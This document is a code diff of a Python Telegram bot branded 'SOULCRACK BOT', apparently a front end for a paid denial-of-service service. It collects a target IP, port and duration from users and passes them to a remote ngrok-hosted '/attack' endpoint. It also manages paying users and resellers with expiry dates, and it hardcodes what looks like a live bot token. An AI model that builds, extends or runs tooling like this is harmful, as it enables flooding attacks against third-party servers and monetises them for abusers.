@@ -1,12 +1,11 @@
-import os, json, requests, logging, threading
+import os, json, requests, logging, threading, time
 from datetime import datetime, timedelta
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from flask import Flask
 from threading import Thread
 
-# Logging & Flask for Render
-logging.basicConfig(level=logging.INFO)
+# Flask for Render to keep it alive
 app = Flask('')
 @app.route('/')
 def home(): return "Bot is Live!"
@@ -17,78 +16,109 @@ def keep_alive(): Thread(target=run).start()
 BOT_TOKEN = "8748437919:AAEI0zQ_-0Umg0wqFAbIvCqF9xjssceudo0"
 OWNER_ID = 7529105228
 ADMIN_IDS = [7529105228]
-users_file = 'users_db.json'
+DB_FILE = 'users_db.json'
 
 # --- DATABASE LOGIC ---
 def load_db():
-    if os.path.exists(users_file):
-        with open(users_file, 'r') as f: return json.load(f)
-    return {"users": {}, "resellers": []}
+    if os.path.exists(DB_FILE):
+        with open(DB_FILE, 'r') as f: return json.load(f)
+    return {"users": {}, "resellers": [], "logs": []}
 
 def save_db(data):
-    with open(users_file, 'w') as f: json.dump(data, f, indent=4)
+    with open(DB_FILE, 'w') as f: json.dump(data, f, indent=4)
 
 db = load_db()
+temp_data = {}
 
-# --- API TRIGGER ---
-def trigger_attack_api(host, port, time):
-    api_url = f"https://bubble-sponge-unpicked.ngrok-free.dev/attack?host={host}&port={port}&time={time}"
+# --- KEYBOARDS ---
+def get_main_keyboard(uid):
+    keyboard = [
+        [KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")],
+        [KeyboardButton("🛑 Stop Attack"), KeyboardButton("🔐 My Access")]
+    ]
+    if uid == OWNER_ID or str(uid) in db["resellers"]:
+        keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])
+    if uid == OWNER_ID:
+        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])
+    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+
+def get_user_mgmt_keyboard():
+    keyboard = [
+        [KeyboardButton("➕ Add User"), KeyboardButton("➖ Remove User")],
+        [KeyboardButton("📋 Users List"), KeyboardButton("« Back to Main Menu")]
+    ]
+    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+
+# --- ATTACK TRIGGER ---
+def trigger_attack(host, port, duration):
+    api_url = f"https://bubble-sponge-unpicked.ngrok-free.dev/attack?host={host}&port={port}&time={duration}"
     try: requests.get(api_url, timeout=5)
     except: pass
 
-# --- KEYBOARDS ---
-def get_keyboard(uid):
-    buttons = [[KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Status")]]
-    if uid == OWNER_ID or str(uid) in db["resellers"]:
-        buttons.append([KeyboardButton("➕ Add User"), KeyboardButton("👥 User List")])
-    if uid == OWNER_ID:
-        buttons.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("⚙️ Settings")])
-    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)
-
-# --- COMMANDS ---
+# --- HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    await update.message.reply_text(f"🚀 **SOULCRACK BOT READY**\nOwner: Devendra", reply_markup=get_keyboard(uid))
+    await update.message.reply_text("🚀 **SOULCRACK BOT v3.0**\nReady for action!", reply_markup=get_main_keyboard(uid))
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     text = update.message.text
-    
+
     if text == "🎯 Launch Attack":
         if str(uid) not in db["users"] and uid != OWNER_ID:
-            await update.message.reply_text("❌ No Access! Contact @Devendra")
+            await update.message.reply_text("❌ Access Denied! Contact @Devendra")
             return
-        await update.message.reply_text("Send target in format: `IP PORT TIME` (e.g. 1.1.1.1 80 60)")
+        temp_data[uid] = {"step": "ip"}
+        await update.message.reply_text("🎯 Send Target IP:")
 
-    elif text == "👥 User List":
-        user_list = "\n".join([f"ID: `{k}` (Ends: {v})" for k, v in db["users"].items()])
-        await update.message.reply_text(f"👥 **APPROVED USERS:**\n{user_list if user_list else 'No users'}")
+    elif text == "📊 Check Status":
+        status = "🟢 Bot is Online\n⚡ API: Connected\n🚀 Attack: Ready"
+        await update.message.reply_text(status)
 
-    elif len(text.split()) == 3: # Attack Input
-        parts = text.split()
-        trigger_attack_api(parts[0], parts[1], parts[2])
-        await update.message.reply_text(f"🚀 **ATTACK SENT!**\nTarget: {parts[0]}:{parts[1]}\nTime: {parts[2]}s")
+    elif text == "🔐 My Access":
+        expiry = db["users"].get(str(uid), "Permanent" if uid == OWNER_ID else "No Access")
+        await update.message.reply_text(f"🔐 **YOUR ACCESS:**\nStatus: Active\nExpiry: `{expiry}`")
 
-# --- ADMIN COMMANDS ---
-async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID: return
-    try:
-        args = context.args
-        target_id, days = args[0], int(args[1])
-        expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
-        db["users"][target_id] = expiry
-        save_db(db)
-        await update.message.reply_text(f"✅ User {target_id} added for {days} days.")
-    except:
-        await update.message.reply_text("Use: `/add ID DAYS`")
+    elif text == "👥 User Management":
+        if uid == OWNER_ID or str(uid) in db["resellers"]:
+            await update.message.reply_text("👥 **USER MANAGEMENT**", reply_markup=get_user_mgmt_keyboard())
+
+    elif text == "📋 Users List":
+        ulist = "\n".join([f"ID: `{k}` (Exp: {v})" for k, v in db["users"].items()])
+        await update.message.reply_text(f"📋 **APPROVED USERS:**\n{ulist if ulist else 'Empty'}")
+
+    elif text == "➕ Add User":
+        temp_data[uid] = {"step": "add_id"}
+        await update.message.reply_text("➕ Send User ID to Add:")
+
+    elif text == "« Back to Main Menu":
+        await update.message.reply_text("Main Menu", reply_markup=get_main_keyboard(uid))
+
+    elif uid in temp_data:
+        step = temp_data[uid]["step"]
+        if step == "ip":
+            temp_data[uid].update({"ip": text, "step": "port"})
+            await update.message.reply_text("🎯 Send Port:")
+        elif step == "port":
+            temp_data[uid].update({"port": text, "step": "time"})
+            await update.message.reply_text("🎯 Send Time (sec):")
+        elif step == "time":
+            ip, port = temp_data[uid]["ip"], temp_data[uid]["port"]
+            trigger_attack(ip, port, text)
+            await update.message.reply_text(f"🚀 **ATTACK SENT!**\nTarget: `{ip}:{port}`\nTime: `{text}s`")
+            del temp_data[uid]
+        elif step == "add_id":
+            db["users"][text] = (datetime.now() + timedelta(days=30)).strftime('%Y-%m-%d')
+            save_db(db)
+            await update.message.reply_text(f"✅ User `{text}` added for 30 days.")
+            del temp_data[uid]
 
 def main():
     keep_alive()
-    application = Application.builder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("add", add_user))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    application.run_polling()
+    app_bot = Application.builder().token(BOT_TOKEN).build()
+    app_bot.add_handler(CommandHandler("start", start))
+    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app_bot.run_polling()
 
 if __name__ == '__main__':
     main()
